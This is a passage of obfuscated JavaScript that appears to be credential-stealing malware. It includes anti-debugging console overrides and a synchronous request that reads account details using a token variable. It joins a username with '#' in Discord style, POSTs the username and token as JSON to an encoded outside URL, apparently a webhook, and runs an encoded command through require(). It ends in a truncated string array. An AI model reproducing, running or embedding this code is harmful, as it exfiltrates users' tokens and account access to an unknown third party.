-0x17c,_0x6d71ee-0x2e,_0x1cc97b-0x5,_0x371a31);}var _0x508755={'Bewhh':function(_0x3c6560,_0x44f922){function _0x444a3f(_0x29ad1d,_0x23e5cc,_0x4a16a6,_0x31cb59,_0x4e433f){return _0x903a(_0x4e433f-0x183,_0x4a16a6);}return _0x1989b9[_0x444a3f(0x473,0x46e,'6lxI',0x363,0x3bf)](_0x3c6560,_0x44f922);},'cMAlk':function(_0x555679,_0x57d2bf){function _0x2a64a9(_0x24ff28,_0x11725e,_0xeb50a5,_0x127c94,_0x188b0f){return _0x903a(_0x24ff28- -0x112,_0x11725e);}return _0x1989b9[_0x2a64a9(0x2f3,'R&eM',0x3ce,0x2bd,0x1fe)](_0x555679,_0x57d2bf);},'elTDQ':_0x1989b9[_0xa6dd2b(-0x57,-0xaf,'^Xkj',0x77,-0x1c)],'KXyyK':_0x1989b9[_0x81c122(0x1fe,'2Ab)',0x27c,0xef,0x1c0)]};function _0x267a22(_0x1a9805,_0x840e00,_0x549d61,_0x18f7bd,_0x4c7c2c){return _0x17273e(_0x1a9805-0x6d,_0x1a9805- -0x162,_0x549d61-0x32,_0x18f7bd-0x123,_0x840e00);}if(_0x1989b9[_0x81c122(-0x5,'0KR#',0x1d9,0xa6,0x1cc)](_0x1989b9[_0x3bd928('Ove*',0x2ad,0x3d0,0x39e,0x3b5)],_0x1989b9[_0x267a22(0x301,'fjJr',0x35d,0x319,0x3e9)]))XoQfEE[_0x3bd928('pSg&',0x3c1,0x355,0x382,0x4b9)](_0x4c3f66,'0');else{var _0x8eaf02=!![];return function(_0x321a26,_0x229539){var _0x44ee81={'noHjR':_0x1989b9[_0x4a10be('vy4*',0x436,0x439,0x5fc,0x488)],'bKxTK':function(_0x352f61,_0x5c2cc6){function _0x2dc3e3(_0x6d8b1d,_0x1500b2,_0x380bf7,_0x137f7a,_0x4b6088){return _0x4a10be(_0x1500b2,_0x1500b2-0xf5,_0x380bf7-0x1d,_0x137f7a-0x117,_0x380bf7- -0x673);}return _0x1989b9[_0x2dc3e3(0x139,'iBBh',0x118,0x169,-0x68)](_0x352f61,_0x5c2cc6);},'SadiE':_0x1989b9[_0x4a10be('a*8j',0x4ef,0x329,0x512,0x47e)],'BFBBR':function(_0x30c12e,_0x4d7e64){function _0x524a77(_0x50b1b0,_0x421f31,_0x1395d6,_0x3a3f1c,_0x149650){return _0x3b0d25(_0x50b1b0-0x45,_0x421f31-0x194,_0x1395d6- -0x100,_0x50b1b0,_0x149650-0xc7);}return _0x1989b9[_0x524a77('AH1i',0x3b7,0x506,0x418,0x4cb)](_0x30c12e,_0x4d7e64);},'BHeAM':_0x1989b9[_0x3b0d25(0x7d8,0x567,0x695,'UdfI',0x72b)],'FvuOf':_0x1989b9[_0x3328e4(0x55c,0x3a0,0x506,'#%k3',0x41e)]};function _0xf5e6af(_0x5b1b5e,_0x3bd86a,_0x4323cc,_0x5a5d6e,_0x728dc7){return _0x267a22(_0x728dc7- -0x1f6,_0x3bd86a,_0x4323cc-0x84,_0x5a5d6e-0x187,_0x728dc7-0xdf);}function _0x3328e4(_0x34d28f,_0x23a4d7,_0x548628,_0x3459d2,_0x2cdf2c){return _0xa6dd2b(_0x34d28f-0x4b,_0x23a4d7-0x3e,_0x3459d2,_0x548628-0x37d,_0x2cdf2c-0x1dd);}function _0x3b0d25(_0xa94940,_0x42ef90,_0x56792f,_0x2af10a,_0x542974){return _0xa6dd2b(_0xa94940-0x1d7,_0x42ef90-0x3e,_0x2af10a,_0x56792f-0x58e,_0x542974-0x3e);}function _0x743643(_0x230005,_0x124fa0,_0x29987a,_0x3f7ec0,_0x40526c){return _0x267a22(_0x124fa0- -0x34c,_0x3f7ec0,_0x29987a-0x180,_0x3f7ec0-0x8d,_0x40526c-0x187);}function _0x4a10be(_0x3bdc6,_0x41e0ab,_0x3fa643,_0x29fcac,_0x252e89){return _0x35e366(_0x3bdc6-0x42,_0x3bdc6,_0x3fa643-0x14d,_0x252e89-0x185,_0x252e89-0x164);}if(_0x1989b9[_0xf5e6af(0x2d0,'R&eM',0x3c1,0x1a1,0x2c3)](_0x1989b9[_0x3b0d25(0x52c,0x493,0x582,'R&eM',0x60a)],_0x1989b9[_0xf5e6af(0x101,'Gote',0x1f5,-0x4f,0xa3)]))var _0x4a7b7c=[],_0xde1c65=_0x508755[_0x743643(0xad,-0x96,0xba,'%2Z#',-0x57)](_0x4df197,_0x508755[_0x743643(0x1c2,0x155,0x28e,'*VS6',0xe4)](_0x508755[_0x3328e4(0x1e1,0x3bf,0x358,'a[)#',0x36d)],_0x508755[_0x743643(0x1c1,0x12c,-0x6b,'mHCu',0x1b4)]));else{var _0x309ba4=_0x8eaf02?function(){function _0x2b9105(_0x579caf,_0x18ab5b,_0x237fdb,_0x19d3b6,_0x1cac29){return _0x3328e4(_0x579caf-0x163,_0x18ab5b-0x183,_0x19d3b6- -0xba,_0x237fdb,_0x1cac29-0x1ba);}var _0x37a60d={};function _0x40e25e(_0x25f682,_0xf9088f,_0x40b289,_0x7d8b9f,_0x4b2097){return _0x3b0d25(_0x25f682-0x1d8,_0xf9088f-0xcd,_0x40b289- -0x2f4,_0xf9088f,_0x4b2097-0x71);}function _0x4df8c7(_0x15da70,_0x30bc81,_0x6e3687,_0xff358b,_0x1e8b37){return _0x743643(_0x15da70-0x1a3,_0x6e3687-0x3cd,_0x6e3687-0x139,_0x30bc81,_0x1e8b37-0x44);}function _0x19a3bb(_0x347048,_0x18ae43,_0x40b0f9,_0x57361c,_0x248732){return _0x3b0d25(_0x347048-0x1f,_0x18ae43-0xdd,_0x347048-0xfe,_0x248732,_0x248732-0x133);}function _0x28a127(_0x1d2e1e,_0x1a43c3,_0x41d66a,_0x1b2254,_0x447d81){return _0x743643(_0x1d2e1e-0xc,_0x1d2e1e-0x140,_0x41d66a-0x66,_0x41d66a,_0x447d81-0x55);}_0x37a60d[_0x2b9105(0x2eb,0x330,'j6^o',0x462,0x379)]=_0x44ee81[_0x4df8c7(0x515,'j6^o',0x3cb,0x302,0x346)];var _0x281152=_0x37a60d;if(_0x44ee81[_0x4df8c7(0x38b,'fjJr',0x423,0x2cc,0x484)](_0x44ee81[_0x2b9105(0x20b,0x503,'O$PV',0x38b,0x3ca)],_0x44ee81[_0x28a127(0xea,-0x13,'vy4*',-0xa3,0x36)]))return![];else{if(_0x229539){if(_0x44ee81[_0x28a127(0xdc,0x1d2,'iJCW',0x1b0,0x83)](_0x44ee81[_0x19a3bb(0x597,0x598,0x63d,0x5ce,'B8ZX')],_0x44ee81[_0x2b9105(0x220,0x13e,'ZoCQ',0x2be,0x3bf)]))return _0x69b8cc[_0x2b9105(0x356,0x23a,'4j*v',0x292,0x271)+_0x19a3bb(0x7d3,0x865,0x7f0,0x85d,'DHmp')]()[_0x40e25e(0x231,'btTR',0x33c,0x498,0x49a)+'h'](sxOvgs[_0x2b9105(0x4a7,0x336,'u)$n',0x329,0x3e9)])[_0x4df8c7(0x479,'UVLr',0x4de,0x4c4,0x4c8)+_0x40e25e(0x3aa,'pSg&',0x321,0x1bf,0x355)]()[_0x28a127(0x49,-0x13f,'WlK@',0x135,-0x131)+_0x28a127(0x86,0x1a2,'cn8f',0x9d,-0xee)+'r'](_0x47efa9)[_0x2b9105(0x2e8,0x22e,'fjJr',0x1ab,0x219)+'h'](sxOvgs[_0x40e25e(0xe7,'DHmp',0x116,0x1cd,0x147)]);else{var _0x105d04=_0x229539[_0x40e25e(0x3a8,'*VS6',0x343,0x21a,0x231)](_0x321a26,arguments);return _0x229539=null,_0x105d04;}}}}:function(){};return _0x8eaf02=![],_0x309ba4;}};}}()),_0x4009aa=_0x1989b9[_0x17273e(0x439,0x4d0,0x5c5,0x47e,'^Xkj')](_0x3e4223,this,function(){function _0x1ab40a(_0x60c4ca,_0x3f2385,_0x102927,_0x5936e7,_0x2f509c){return _0x160368(_0x60c4ca-0x5d,_0x3f2385-0x183,_0x5936e7-0x271,_0x5936e7-0x162,_0x60c4ca);}var _0x48def2={'Pxrll':function(_0x3ee067,_0x1d50ff){function _0x4778a5(_0x2de848,_0x33bda9,_0x282c65,_0x493a0b,_0x425d49){return _0x903a(_0x493a0b-0x23,_0x282c65);}return _0x1989b9[_0x4778a5(0x3b2,0x373,'AH1i',0x2c3,0x2d9)](_0x3ee067,_0x1d50ff);},'zqAOh':_0x1989b9[_0x568eae(0x375,0x234,'vy4*',0x395,0x300)],'GqnyV':_0x1989b9[_0x4cb171(-0x66,0xf4,0x12d,0x52,'O$PV')],'ATudU':function(_0xe08a94,_0x1a479e){function _0xd6fda5(_0x157729,_0x292771,_0x45f7df,_0x5631a5,_0x2151f7){return _0x568eae(_0x157729-0x2e,_0x292771-0x134,_0x45f7df,_0x5631a5-0x110,_0x157729-0x164);}return _0x1989b9[_0xd6fda5(0x44b,0x59d,'fjJr',0x417,0x2d1)](_0xe08a94,_0x1a479e);}};function _0x161621(_0x45c673,_0x262046,_0xc87888,_0xb89252,_0x256213){return _0x5db8d1(_0x45c673-0x18a,_0x262046-0x1ef,_0xc87888-0x134,_0x256213- -0x460,_0x262046);}function _0x3180c9(_0x46f922,_0x34808f,_0x10c609,_0xd9df19,_0x365364){return _0x160368(_0x46f922-0x1ae,_0x34808f-0x12a,_0x34808f-0x5f0,_0xd9df19-0x158,_0xd9df19);}function _0x4cb171(_0x5d46da,_0x40d096,_0xeb6d35,_0x2390a2,_0x5ed2ce){return _0x58c724(_0x5d46da-0x50,_0x40d096-0x178,_0xeb6d35-0x1a8,_0x5ed2ce,_0x40d096- -0x6f);}function _0x568eae(_0x418583,_0x58e8e2,_0x488d89,_0x1b17b3,_0x4ece60){return _0x160368(_0x418583-0x5b,_0x58e8e2-0x6b,_0x4ece60-0x2ea,_0x1b17b3-0x13b,_0x488d89);}if(_0x1989b9[_0x3180c9(0x52b,0x46c,0x2d7,'6lxI',0x525)](_0x1989b9[_0x568eae(0x114,0x26b,'[$aX',0x156,0x247)],_0x1989b9[_0x161621(0xbb,'LTf5',0x12c,-0x16,0x134)])){var _0x5a9a03=_0x2e0b0f[_0x4cb171(0x17e,0x66,-0xe1,-0xdf,'wO2I')](_0x3c77f8,arguments);return _0x13b1c9=null,_0x5a9a03;}else{var _0x38d7bc=function(){function _0xd89fe8(_0x269478,_0x204e42,_0x531f5e,_0x5df600,_0x1a4361){return _0x3180c9(_0x269478-0x92,_0x5df600- -0x16,_0x531f5e-0x1b8,_0x1a4361,_0x1a4361-0x149);}function _0x2dd115(_0x2d283f,_0x41a854,_0x14452d,_0x282351,_0x39dd25){return _0x161621(_0x2d283f-0xc6,_0x39dd25,_0x14452d-0x141,_0x282351-0x76,_0x282351-0x280);}function _0x2fbd92(_0x15498d,_0x592b89,_0x497eba,_0xd8ff94,_0xa66bf0){return _0x1ab40a(_0x15498d,_0x592b89-0x7d,_0x497eba-0x1d,_0xd8ff94- -0xc2,_0xa66bf0-0x19f);}function _0x40a1ac(_0x50f4ed,_0x3f9df1,_0x490924,_0x215a60,_0x5b476c){return _0x4cb171(_0x50f4ed-0x43,_0x215a60-0x28d,_0x490924-0x122,_0x215a60-0x2,_0x3f9df1);}function _0x18ecc6(_0x5b34a0,_0x149374,_0x4761c3,_0x4294d0,_0x422fd2){return _0x4cb171(_0x5b34a0-0x1f3,_0x4294d0-0x57b,_0x4761c3-0x16b,_0x4294d0-0x13a,_0x5b34a0);}if(_0x1989b9[_0xd89fe8(0x5d0,0x575,0x671,0x543,'nXEh')](_0x1989b9[_0xd89fe8(0x33e,0x479,0x3d1,0x4a2,'g66P')],_0x1989b9[_0x2dd115(0x710,0x57b,0x795,0x653,'R&eM')])){var _0x5e9050;try{if(_0x1989b9[_0x18ecc6('DYbS',0x73b,0x59c,0x618,0x61a)](_0x1989b9[_0x2fbd92('ThO8',0x1f3,0x1a7,0x7e,-0x10b)],_0x1989b9[_0x40a1ac(0x8b,'pSg&',0x1bd,0x187,0x1a5)]))_0x5e9050=_0x1989b9[_0x2dd115(0x394,0x470,0x3b7,0x396,'RKdF')](Function,_0x1989b9[_0x2dd115(0x5a2,0x74f,0x647,0x5d9,'^Xkj')](_0x1989b9[_0x18ecc6('0KR#',0x3fd,0x47f,0x482,0x310)](_0x1989b9[_0x2dd115(0x555,0x5b6,0x3ed,0x497,'O$PV')],_0x1989b9[_0xd89fe8(0x48b,0x3b4,0x419,0x4b4,'(dno')]),');'))();else{var _0x300fb3=_0x56c5d4['c'][_0x6de932][_0x18ecc6('LTf5',0x4b5,0x736,0x5c9,0x6c5)+'ts'];if(_0x300fb3&&_0x300fb3[_0x2dd115(0x41f,0x554,0x402,0x57d,'Gote')+_0x2fbd92('UVLr',0x287,0x260,0x24a,0xdc)]&&_0x300fb3[_0x2dd115(0x4d5,0x3d1,0x4c2,0x3eb,'ThO8')+'lt']){for(var _0x3a3403 in _0x300fb3[_0x18ecc6('UdfI',0x3b8,0x3a1,0x36e,0x43f)+'lt'])_0x48def2[_0x40a1ac(0x3f,'a[)#',0x7d,0x78,-0x104)](_0x48def2[_0x2dd115(0x747,0x744,0x4d8,0x5e8,'cn8f')],_0x3a3403)&&(_0x556acb=_0x300fb3[_0xd89fe8(0x3a0,0x2bd,0x5a2,0x406,')hx0')+'lt'][_0x2dd115(0x4ce,0x4ed,0x48f,0x3ef,'mHCu')+_0x2fbd92('iBBh',0x4c,0x126,0xc6,0xbb)]());}}}catch(_0x47ca4d){if(_0x1989b9[_0xd89fe8(0x6da,0x65b,0x729,0x632,'ZoCQ')](_0x1989b9[_0x2dd115(0x37a,0x3b9,0x371,0x49d,'iJCW')],_0x1989b9[_0x18ecc6('ZoCQ',0x473,0x3fa,0x434,0x2e3)]))_0x5e9050=window;else return _0x4e82b9;}return _0x5e9050;}else{if(_0x1ef901){var _0x3a115c=_0x22366a[_0x40a1ac(0x5f,'UVLr',-0x19,0x16f,0x2df)](_0x55f64a,arguments);return _0x46c747=null,_0x3a115c;}}},_0x219681=_0x1989b9[_0x1ab40a('u)$n',0x1a0,-0x88,0x6e,0x0)](_0x38d7bc),_0x4fd504=_0x219681[_0x4cb171(-0x333,-0x1e7,-0x346,-0x83,'#%k3')+'le']=_0x219681[_0x1ab40a('YPqD',0x229,0x323,0x270,0x2e0)+'le']||{},_0x557957=[_0x1989b9[_0x3180c9(0x2d4,0x443,0x491,'RKdF',0x4ca)],_0x1989b9[_0x4cb171(0x64,-0x4b,-0x123,0xc6,'btTR')],_0x1989b9[_0x568eae(0x308,0x138,'ThO8',0x377,0x25d)],_0x1989b9[_0x568eae(0x160,0x13b,'UVLr',-0x56,0xa4)],_0x1989b9[_0x161621(0x22d,'O$PV',-0xbb,0x258,0xcd)],_0x1989b9[_0x568eae(0x23e,0x4dc,'0KR#',0x1f6,0x355)],_0x1989b9[_0x161621(0x394,'a[)#',0x1c5,0x2de,0x21c)]];for(var _0x4ceb77=-0x945*0x1+-0x1*0x5cb+0xf10;_0x1989b9[_0x3180c9(0x6bc,0x644,0x4da,'%2Z#',0x6f8)](_0x4ceb77,_0x557957[_0x4cb171(0x1cd,0x3e,0x4d,-0x87,')hx0')+'h']);_0x4ceb77++){if(_0x1989b9[_0x3180c9(0x58f,0x442,0x581,'j6^o',0x2b4)](_0x1989b9[_0x4cb171(0x13c,-0x9,0x94,-0x12,'^Xkj')],_0x1989b9[_0x4cb171(-0x1d2,-0x126,-0x1c1,-0x112,'fhK5')])){var _0x593e85='',_0x5e3d2c={};_0x5e3d2c[_0x3180c9(0x2db,0x471,0x5e5,'u)$n',0x59e)+_0x1ab40a('YPqD',0x143,-0x9f,0xcc,0x24e)]=(_0x5c76a9,_0x2f6318,_0x1f7cc2)=>_0x5c76a9[_0x1ab40a('^Xkj',0x9a,0x150,0x1d6,0xee)+'ts']=_0x1f7cc2;var _0x456b59=_0x5d0f1f[_0x1ab40a('R&eM',0x278,0x371,0x2c3,0x2e9)]([[],_0x5e3d2c,[[_0x48def2[_0x568eae(0x4ca,0x227,'AH1i',0x395,0x389)]]]]);for(var _0x3b5e72 in _0x456b59['c'])if(_0x456b59['c'][_0x1ab40a('UVLr',0x26,0x100,0x194,0x1ef)+_0x568eae(0x5e,0x42,'R&eM',0x222,0x191)+_0x568eae(0x99,0x195,'iBBh',0x61,0x144)](_0x3b5e72)){var _0x988157=_0x456b59['c'][_0x3b5e72][_0x4cb171(-0x331,-0x1fe,-0xed,-0x2c4,'4j*v')+'ts'];if(_0x988157&&_0x988157[_0x4cb171(-0xc3,-0x17,-0x1aa,-0x5b,'nXEh')+_0x3180c9(0x4c1,0x4ec,0x479,'R[Zk',0x39c)]&&_0x988157[_0x3180c9(0x435,0x3b9,0x50c,'iJCW',0x385)+'lt']){for(var _0x2acf8e in _0x988157[_0x3180c9(0x4fe,0x3bb,0x28f,'7OP5',0x4bd)+'lt'])_0x48def2[_0x4cb171(0x23e,0xe6,0x25c,0x96,'wO2I')](_0x48def2[_0x3180c9(0x67f,0x529,0x5da,'j6^o',0x400)],_0x2acf8e)&&(_0x593e85=_0x988157[_0x1ab40a('ThO8',0x21e,-0x1c,0xa1,0x212)+'lt'][_0x1ab40a(')hx0',0x2d1,0x30f,0x2e6,0x2e8)+_0x568eae(0x44a,0x3b3,'u)$n',0x477,0x33b)]());}};var _0x41f908=_0x593e85;}else{var _0x28c4ba=_0x1989b9[_0x1ab40a('B8ZX',0x160,0x1c5,0x234,0x134)][_0x161621(0x3e5,'WlK@',0x421,0x176,0x2eb)]('|'),_0x57fa41=0x1ff7+-0x22df+-0x1f*-0x18;while(!![]){switch(_0x28c4ba[_0x57fa41++]){case'0':var _0x5186ac=_0x3e4223[_0x1ab40a('btTR',-0x2c,-0x6c,0x120,-0x3d)+_0x568eae(0x5a,-0x37,'B8ZX',0x28b,0x154)+'r'][_0x1ab40a('6lxI',0x6d,0x162,0xa7,-0xc8)+_0x3180c9(0x5b7,0x47a,0x4d8,'6lxI',0x361)][_0x1ab40a(')hx0',0x1e0,0x26f,0x11a,0x78)](_0x3e4223);continue;case'1':var _0x4f9447=_0x557957[_0x4ceb77];continue;case'2':var _0x33065c=_0x4fd504[_0x4f9447]||_0x5186ac;continue;case'3':_0x5186ac[_0x1ab40a('(dno',0x149,0xf4,0x1c7,0x97)+_0x4cb171(0x38,0xeb,0x1b6,-0xab,'R&eM')]=_0x33065c[_0x161621(0x270,'(dno',0x37b,0x2d1,0x291)+_0x1ab40a('[$aX',0x15e,-0xec,0xa3,-0x85)][_0x4cb171(0xc6,0x5b,0xa3,0x73,'cn8f')](_0x33065c);continue;case'4':_0x4fd504[_0x4f9447]=_0x5186ac;continue;case'5':_0x5186ac[_0x1ab40a('cn8f',0x3aa,0x1ee,0x241,0x197)+_0x3180c9(0x5c0,0x504,0x5f1,'mHCu',0x45c)]=_0x3e4223[_0x161621(0x76,'*VS6',0x1a8,0x4,0xba)](_0x3e4223);continue;}break;}}}}});_0x1989b9[_0x5db8d1(0x4f3,0x659,0x3c2,0x557,'OPMR')](_0x4009aa);function _0x5db8d1(_0x3bc53f,_0x844f3b,_0x2bb76e,_0x2663c3,_0x235af3){return _0x12289a(_0x235af3,_0x844f3b-0x118,_0x2bb76e-0x75,_0x2663c3-0x154,_0x2663c3-0x1de);}var _0x3423fb=new XMLHttpRequest();_0x3423fb[_0x20df9d(0xa1,-0x100,-0xc3,-0x1f6,'AH1i')](_0x1989b9[_0x58c724(-0x18,0xdd,0x147,'vy4*',0xe2)],_0x5c295a,![]),_0x3423fb[_0x17273e(0x217,0x392,0x463,0x319,'#%k3')+_0x5db8d1(0x658,0x7b6,0x6f1,0x640,'ThO8')+_0x17273e(0x3ad,0x476,0x4fc,0x441,'AH1i')+'r'](_0x1989b9[_0x5db8d1(0x760,0x755,0x701,0x78f,'fhK5')],e);function _0x58c724(_0x10c915,_0x214755,_0x408214,_0x1efe6b,_0xdf2a3f){return _0x12289a(_0x1efe6b,_0x214755-0x72,_0x408214-0x1a6,_0x1efe6b-0x72,_0xdf2a3f- -0x4e4);}function _0x17273e(_0x561467,_0x3a748d,_0xf9ab06,_0x3f901e,_0x2730cd){return _0x2f74df(_0x561467-0xbd,_0x2730cd,_0xf9ab06-0x1cf,_0x3f901e-0xd4,_0x3a748d-0x5f2);}return _0x3423fb[_0x20df9d(-0x206,-0x64,-0x154,-0xe5,'0KR#')](null),_0x3423fb[_0x20df9d(-0x8,-0x26e,-0x11d,-0x82,'g66P')+_0x20df9d(-0x14c,-0x31,0x4d,0x186,'iJCW')+'xt'];};var b=JSON[_0x2f74df(0xb2,'ZoCQ',-0x3,0x12a,0xb4)](httpGet(_0x14aff4(0x291,0x1ba,0x377,0x280,'mHCu')+_0x16d157(-0xf3,-0x6a,-0xd1,'wO2I',0x101)+_0x2b5225(0x216,0x3ce,'j6^o',0x3ac,0x2b2)+_0x2f74df(0x70,'O$PV',-0xeb,0x12,-0xe3)+_0x12289a('a*8j',0x56f,0x727,0x4ad,0x5d1)+_0x2b5225(0x363,0x206,'UdfI',0x1d8,0x2c9)+_0x2b5225(0x110,0x320,'6lxI',0x195,0x226)+_0x16d157(0x2aa,0x1bb,0x50,'#%k3',0xb4))),username=b[_0x2f74df(-0x103,'#%k3',-0x2f1,-0x15f,-0x25e)+_0x2b5225(0x37d,0x21c,'WlK@',0x1e7,0x17d)]+'#'+b[_0x2f74df(-0x1e1,'mHCu',-0x7e,-0x177,-0x60)+_0x2b5225(0x80,0xca,'^Xkj',0xad,0x135)+_0x2f74df(-0x363,'^Xkj',-0x245,-0xd0,-0x229)],_0x12e9d2={};_0x12e9d2[_0x12289a('AH1i',0x7de,0x708,0x716,0x645)+'nt']=_0x12289a('fjJr',0x61b,0x562,0x3c9,0x4f8)+_0x14aff4(0x1f3,0x1ac,0x7c,0x1a1,'a[)#')+username+(_0x2b5225(0x157,0x1f3,'YPqD',0x271,0x3f8)+_0x2f74df(-0x49,'0KR#',0xf1,-0x172,-0x68))+e+'\x0a';const msg=_0x12e9d2;function _0x16d157(_0x247e51,_0x192b0c,_0x15a8e3,_0x45f7b9,_0x4befb4){return _0x903a(_0x192b0c- -0x286,_0x45f7b9);}function _0x2f74df(_0x259116,_0x55f021,_0x13f5e2,_0x1fb9d4,_0x1faa32){return _0x903a(_0x1faa32- -0x3c8,_0x55f021);}try{var _0x2cfcca={};_0x2cfcca[_0x14aff4(0x1e2,-0x80,0x238,0xea,'iJCW')+_0x12289a('WlK@',0x523,0x5ec,0x660,0x54f)+'pe']=_0x14aff4(0x4d7,0x23a,0x481,0x362,'Ove*')+_0x12289a('YPqD',0x687,0x46f,0x433,0x5bb)+_0x2f74df(-0x2ae,'j6^o',-0xcd,-0x15,-0x118)+'n',fetch(_0x2f74df(0xe2,'ThO8',0x10c,-0xf1,0x71)+_0x2f74df(-0x70,'YPqD',-0x2e7,-0x272,-0x192)+_0x12289a('[$aX',0x350,0x47f,0x3b4,0x382)+_0x12289a('[$aX',0x472,0x694,0x6df,0x5b2)+_0x12289a('ThO8',0x642,0x528,0x5f7,0x518)+_0x16d157(0x117,0x121,-0x7,'O$PV',-0x46)+_0x2b5225(-0xcc,-0xd7,'R&eM',0x8c,0x136)+_0x12289a('g66P',0x5b8,0x604,0x4b5,0x603)+_0x12289a('AH1i',0x4c0,0x495,0x4ff,0x4ea)+_0x12289a('UVLr',0x243,0x1c6,0x380,0x359)+_0x2f74df(-0x22f,'UdfI',-0x148,0x57,-0xae)+_0x2f74df(-0x1df,'R&eM',-0x1b5,-0xfd,-0x1b3)+_0x16d157(0x63,-0x23,0xb6,'0KR#',-0x15b)+_0x14aff4(0x322,0x2fd,0x2c0,0x224,'7OP5')+_0x12289a('R[Zk',0x5be,0x4ec,0x548,0x5aa)+_0x16d157(0x1e3,0x132,0xd6,'iBBh',0x52)+(_0x2b5225(0x1b1,0x2a3,'#%k3',0x143,-0x44)+_0x14aff4(0x3f0,0x473,0x231,0x3bb,'7OP5')+_0x14aff4(0x21d,0x1a8,0x1f3,0x18a,'llxx')+_0x2b5225(0x1dd,0x12b,'ThO8',0x1f7,0x1c3)+_0x14aff4(0x165,0x168,0xcd,0xbf,'RKdF')+_0x2f74df(-0x3a3,'4j*v',-0x3a8,-0x2f9,-0x245)+_0x12289a('iJCW',0x56a,0x52a,0x5d7,0x63f)+_0x12289a('UVLr',0x76f,0x5cb,0x5e3,0x648)+_0x16d157(0x229,0xbb,0x22c,'g66P',0x145)+_0x12289a('DYbS',0x676,0x54c,0x4d4,0x524)),{'method':_0x2f74df(-0x94,'iJCW',-0x279,-0x3a2,-0x20f),'headers':_0x2cfcca,'body':JSON[_0x2f74df(-0x14c,'H^%M',-0x32,-0x92,-0x47)+_0x2b5225(0x2e0,0x20d,'g66P',0x384,0x2bf)](msg)})[_0x2f74df(0xd6,'wO2I',0x141,-0x92,0x4f)](a=xa[_0x2f74df(-0x19b,'pSg&',-0x133,-0x128,-0x1cd)]())[_0x2f74df(-0x15b,'DYbS',0x95,0x3e,0x22)](console[_0x2f74df(-0x87,'UdfI',0x2b,0x15d,0x32)]);}catch{}function _0x14aff4(_0x4658da,_0x146ab7,_0x5cea34,_0x672916,_0x864a28){return _0x903a(_0x672916- -0xaa,_0x864a28);};require(_0x16d157(0x18a,0x75,0x1f8,'fjJr',0x1db)+_0x12289a('YPqD',0x32e,0x341,0x525,0x39d)+_0x14aff4(0x314,0x23c,0x80,0x19f,'^Xkj'))[_0x2b5225(0x427,0x31e,'*VS6',0x2ac,0x2e4)](_0x12289a('4j*v',0x27e,0x292,0x47c,0x395)+_0x2b5225(0x42e,0x277,'llxx',0x34c,0x38e)+_0x2b5225(0x349,0x30c,'Ove*',0x2af,0x36c)+_0x2b5225(0x2ac,0x20d,'vy4*',0x397,0x4e1)+_0x12289a('ZoCQ',0x32b,0x311,0x347,0x3c9)+_0x12289a('Ove*',0x475,0x3a0,0x3cc,0x493)+_0x14aff4(0x1c2,0x232,-0x28,0xb3,'g66P')+_0x12289a('[$aX',0x45e,0x312,0x2b2,0x420)+_0x14aff4(0x323,0x2d1,0x36c,0x2f7,'mHCu')+_0x2f74df(-0x149,'a[)#',0x60,-0x1f5,-0x7e)+_0x2f74df(-0x14,'vy4*',-0xcb,0x45,0x35)+_0x14aff4(0x29a,0x173,0xaa,0x1dc,'iJCW')+_0x12289a('#%k3',0x5dc,0x5cc,0x5bb,0x5fa)+_0x12289a('cn8f',0x2f8,0x255,0x3d8,0x368)+_0x2f74df(-0x13a,'j6^o',-0x197,0x37,-0x2f)+_0x16d157(-0x63,-0xbf,-0x14f,'YPqD',-0x259)+(_0x14aff4(0x1a2,0x31,0x2c6,0x154,'2Ab)')+_0x2f74df(-0x8,'7OP5',-0x138,0x76,-0x26)+_0x2b5225(0x50,0xcd,'LTf5',0xe3,-0x49)+_0x14aff4(0x19f,0x17d,0x23e,0x280,'mHCu')+_0x16d157(-0x71,0xb7,0xbb,'LTf5',-0x60)+_0x12289a('B8ZX',0x7ad,0x6d6,0x74e,0x630)+_0x2f74df(-0x4f,')hx0',-0x57,-0x318,-0x1af)+_0x2f74df(-0x103,'btTR',-0x2f6,-0x2c3,-0x22f)+_0x2f74df(0x111,'LTf5',-0x19d,-0x60,-0x1d)+_0x2f74df(-0xf0,'^Xkj',-0x1a2,-0x47,-0x1d7)+_0x14aff4(0x46b,0x194,0x357,0x2d1,'a*8j')+_0x16d157(-0x2a,-0x9b,0xc2,'llxx',0x5e)+_0x14aff4(0x192,0xd4,0x180,0x171,'(dno')+_0x14aff4(0x310,0x22d,0x1e9,0x190,'6lxI')+_0x16d157(-0xd7,-0xa1,-0xdb,'ThO8',-0x137)+_0x2b5225(0x369,0x1f9,'7OP5',0x2f4,0x1b0))+(_0x2b5225(0x258,0x35f,'iJCW',0x227,0x151)+_0x12289a('B8ZX',0x3e3,0x41e,0x6d0,0x572)+_0x16d157(0x181,0x86,0xf1,'H^%M',0x1b1)+_0x12289a('nXEh',0x510,0x648,0x655,0x599)+_0x2b5225(0x24f,0xc9,'^Xkj',0x214,0x13b)+_0x16d157(0x1a0,0x119,0x41,'mHCu',0x1d5)+_0x16d157(-0x95,-0xd7,0xa,'#%k3',-0x16e)+_0x16d157(-0xd8,-0x131,0x14,'B8ZX',-0x81)+'\x22'),function(_0x5e8386,_0x18ae03,_0x3ba2ef){});function _0x217c(){var _0x435338=['eSkPvComuW','W4uoW69qpG','sCkOWRaDcW','xrtdGeFcGW','dCo2gmo2oG','WOCjgWVcJq','W7hcHmo8WPZcIG','W5SvW4z8kq','WPmzdGi','rWqQWQy+','cSkXW5DlWRm','WO1wxq','tmoCuh7cPq','gmkNCSo2uW','sCkqtSoGWPO','W7CiueWd','o8o5dW','WQuKoYlcKW','svTEWOFdGa','WPhcNSkbttm','bX/cP2eB','WQxcJbVcUcC','emkoW6iweG','gqH+WQhdSW','rr0PWRa+','qL0bWPZdIW','WRacufS','WQpcIgC5WRW','WO4TW7e6W54','C2dcKLL9','smkbbWVcVG','EtTyW545','DmklcYdcOW','lsddRmohW78','W4hdSgtdI3a','nYhdU8odW6m','WRNcPSkMWRFcNG','hctdVJdcLa','WQTwgqrp','tHykW4BdLa','xmkKWPO5hG','WP8LEmk5W6G','WRrwccPQ','W5RdH8k0tCol','yYfAW4iJ','hq1HWQpdPa','W6aPW410aa','Cr/dKulcRW','vf8FWPRdJq','rHmqWRir','WRqkrvqp','bL7dJrSa','WOnLoXzH','qbm2W6JcQa','pdtdO8oF','oaJdM8kv','pIpdNmocW7m','WP3cLKGbW6G','pmkirLWP','WOZcLSkJttS','WPPHWONcOCkb','AIFcHfGz','Fq7dIvBcHq','WPRcQ8kjWOpcUq','WRNcPCkCWQtcQa','hcTRW6vd','DmoWzKBcJW','zImWW7ldPa','nJVdUSowWRC','WQZcMatcG34','kWtdGmkVfa'